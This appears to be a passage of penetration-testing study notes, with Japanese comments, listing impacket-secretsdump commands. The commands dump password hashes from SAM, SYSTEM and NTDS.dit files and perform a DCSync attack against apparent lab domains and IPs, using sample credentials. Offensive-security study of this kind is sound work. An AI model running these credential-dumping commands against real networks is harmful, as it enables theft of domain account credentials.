```sh
impacket-secretsdump -security path/to/security -system path/to/system -ntds path/to/ntds.dit

impacket-secretsdump -sam SAM -system SYSTEM LOCAL

impakcet-secretsdump spookysec.local/backup:password123@spookysec.local
```

### DC同期
```sh
# ドメインコントローラに同期要求を送ることでユーザの認証情報を得られることがある
# デフォルトではDomain Admins, Enterprise Admins, Administratorsグループに、同期の権限ある
# -just-dc-userがDC同期のフラグ
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```